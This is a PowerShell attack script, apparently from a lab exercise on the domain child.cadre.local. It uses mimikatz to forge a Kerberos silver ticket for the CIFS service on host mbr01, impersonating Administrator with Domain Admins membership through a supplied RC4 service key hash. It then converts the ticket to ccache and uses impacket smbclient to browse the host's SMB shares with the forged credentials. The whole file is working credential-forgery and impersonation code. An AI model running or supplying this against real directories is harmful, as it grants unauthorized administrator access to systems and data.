# WT011 silver — explicit-ticket verification via impacket smbclient (-k)
$ErrorActionPreference = 'Continue'
$Mimi = 'C:\Tools\ADTools\mimikatz.exe'
$out = 'C:\Tools\ADTools'

# 1. Forge silver ticket to file (no ptt)
& $Mimi "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /target:mbr01.child.cadre.local /service:cifs /rc4:3a01c6cd54eab57a78377d0ef10cef3f /id:500 /group:512 /ticket:$out\wt011-silver.kirbi" 'exit' 2>&1 | Select-String -Pattern 'successfully|Ticket|PAC|ServiceKey' | Select-Object -First 8 | ForEach-Object { Write-Output "FORGE|$_" }

# 2. kirbi -> ccache (two args)
if (Test-Path "$out\wt011-silver.kirbi") {
    Write-Output "KIRBI_SIZE $((Get-Item "$out\wt011-silver.kirbi").Length)"
    python "$out\kirbi2ccache.py" "$out\wt011-silver.kirbi" "$out\wt011-silver.ccache" 2>&1 | Select-Object -First 5 | ForEach-Object { Write-Output "K2C|$_" }
}

# 3. Explicit-ticket SMB access via impacket
$cc = Get-ChildItem $out -Filter 'wt011-silver*.ccache' -ErrorAction SilentlyContinue | Select-Object -First 1
if ($cc) {
    Write-Output "CCACHE $($cc.FullName)"
    $env:KRB5CCNAME = $cc.FullName
    python -m impacket.examples.smbclient -k -no-pass 'child.cadre.local/Administrator@mbr01.child.cadre.local' -c 'ls' 2>&1 | Select-Object -First 25 | ForEach-Object { Write-Output "SMB_IMPACKET|$_" }
}
Write-Output 'WT011_IMPACKET_DONE'
